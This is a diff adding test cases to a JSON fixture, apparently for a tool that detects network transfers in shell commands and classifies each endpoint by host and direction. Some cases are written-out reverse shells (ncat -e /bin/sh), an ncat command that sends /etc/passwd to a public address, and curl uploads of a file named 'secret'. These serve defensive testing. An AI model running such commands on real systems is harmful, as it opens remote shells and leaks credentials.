@@ -8219,6 +8219,354 @@
      }
     ]
    }
+  },
+  {
+   "command": "curl -G https://8.8.8.8/x",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "curl -G -d data https://8.8.8.8/x",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "curl -Gd data https://8.8.8.8/x",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "ncat -c 'cat /etc/passwd' 8.8.8.8 80",
+   "transfer": {
+    "tool": "nc",
+    "endpoints": [
+     {
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "ncat -c cmd 8.8.8.8 80",
+   "transfer": {
+    "tool": "nc",
+    "endpoints": [
+     {
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "ncat --sh-exec cmd 8.8.8.8 80",
+   "transfer": {
+    "tool": "nc",
+    "endpoints": [
+     {
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "ncat -e /bin/sh 8.8.8.8 80",
+   "transfer": {
+    "tool": "nc",
+    "endpoints": [
+     {
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "ncat --lua-exec x.lua 8.8.8.8 80",
+   "transfer": {
+    "tool": "nc",
+    "endpoints": [
+     {
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "nc -c 8.8.8.8 80",
+   "transfer": {
+    "tool": "nc",
+    "endpoints": [
+     {
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "pwsh -c 'iwr -UnixSocket /var/run/docker.sock http://example.com/info'",
+   "transfer": null
+  },
+  {
+   "command": "pwsh -c 'iwr -UnixSocket: /s http://example.com/info'",
+   "transfer": null
+  },
+  {
+   "command": "pwsh -c 'iwr http://example.com/info'",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "curl http://[::ffff:a00:1]/x",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "::ffff:a00:1",
+      "resolved_host": "::ffff:a00:1",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "curl http://[::ffff:10.0.0.1]/x",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "::ffff:a00:1",
+      "resolved_host": "::ffff:a00:1",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "curl http://[0:0:0:0:0:ffff:7f00:1]/x",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "::ffff:7f00:1",
+      "resolved_host": "::ffff:7f00:1",
+      "address": "loopback"
+     }
+    ]
+   }
+  },
+  {
+   "command": "curl http://[::ffff:808:808]/x",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "::ffff:808:808",
+      "resolved_host": "::ffff:808:808",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "scp C:file 8.8.8.8:/x",
+   "transfer": {
+    "tool": "scp",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "scp file C:x",
+   "transfer": null
+  },
+  {
+   "command": "scp c:/dir/file 8.8.8.8:/x",
+   "transfer": {
+    "tool": "scp",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "8.8.8.8",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "scp file cd:x",
+   "transfer": {
+    "tool": "scp",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "cd",
+      "resolved_host": "cd",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "set -euo pipefail; false | true; curl -T secret https://192.168.1.1/up",
+   "transfer": null
+  },
+  {
+   "command": "set -eu; false | true; curl -T secret https://192.168.1.1/up",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "192.168.1.1",
+      "resolved_host": "192.168.1.1",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "set -euo pipefail; false | ls; curl -T secret https://192.168.1.1/up",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "192.168.1.1",
+      "resolved_host": "192.168.1.1",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "set -euo pipefail; ls | false; curl -T secret https://192.168.1.1/up",
+   "transfer": null
+  },
+  {
+   "command": "set -eo pipefail; ! false | true; curl -T secret https://192.168.1.1/up",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "192.168.1.1",
+      "resolved_host": "192.168.1.1",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "bash -eo pipefail -c 'false | true; curl -T secret https://192.168.1.1/up'",
+   "transfer": null
+  },
+  {
+   "command": "set -o pipefail; false | true && curl -T secret https://192.168.1.1/up",
+   "transfer": null
+  },
+  {
+   "command": "set -e; set -o pipefail; set +o pipefail; false | true; curl -T secret https://192.168.1.1/up",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "192.168.1.1",
+      "resolved_host": "192.168.1.1",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "set -e; setopt pipefail; false | true; curl -T secret https://192.168.1.1/up",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "192.168.1.1",
+      "resolved_host": "192.168.1.1",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "set -e -o pipefail; false | true | true; curl -T secret https://192.168.1.1/up",
+   "transfer": null
+  },
+  {
+   "command": "set -e; (set -o pipefail); false | true; curl -T secret https://192.168.1.1/up",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "192.168.1.1",
+      "resolved_host": "192.168.1.1",
+      "address": "private"
+     }
+    ]
+   }
   }
  ]
 }
